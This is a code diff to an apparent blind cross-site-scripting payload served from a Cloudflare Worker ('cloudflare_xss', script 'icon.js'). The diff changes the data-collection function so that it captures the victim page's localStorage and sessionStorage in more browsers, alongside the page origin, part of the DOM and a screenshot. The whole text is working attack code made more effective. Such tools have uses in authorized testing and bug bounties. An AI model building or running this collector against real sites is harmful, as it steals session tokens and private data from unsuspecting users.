@@ -1,6 +1,3 @@
-var KEY = "pXDvJQs2FZ8BM";
-var DEFAULT_SCRIPT_NAME = "icon.js";
-
 var __create = Object.create;
 var __defProp = Object.defineProperty;
 var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
@@ -132,6 +129,8 @@ var cloudflare_xss_default = {
     return await handleRequest(request, env);
   }
 };
+var KEY = "pXDvJQs2FZ8BM";
+var DEFAULT_SCRIPT_NAME = "icon.js";
 function getUuid() {
   return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function(c) {
     const r = Math.random() * 16 | 0, v = c === "x" ? r : r & 3 | 8;
@@ -269,8 +268,8 @@ function collect_data() {
         try { collected_data["Origin"] = return_value(location.origin); } catch(e) {}
         try { collected_data["DOM"] = return_value(document.documentElement.outerHTML); } catch(e) {}
         collected_data["DOM"] = collected_data["DOM"].slice(0, 8192)
-        try { collected_data["localStorage"] = return_value(localStorage.toSource()); } catch(e) {}
-        try { collected_data["sessionStorage"] = return_value(sessionStorage.toSource()); } catch(e) {}
+        try { collected_data["localStorage"] = return_value(JSON.stringify(localStorage)); } catch(e) {}
+        try { collected_data["sessionStorage"] = return_value(JSON.stringify(sessionStorage)); } catch(e) {}
         try {
             screenshot().then(function(img) {
                 collected_data["Screenshot"] = img
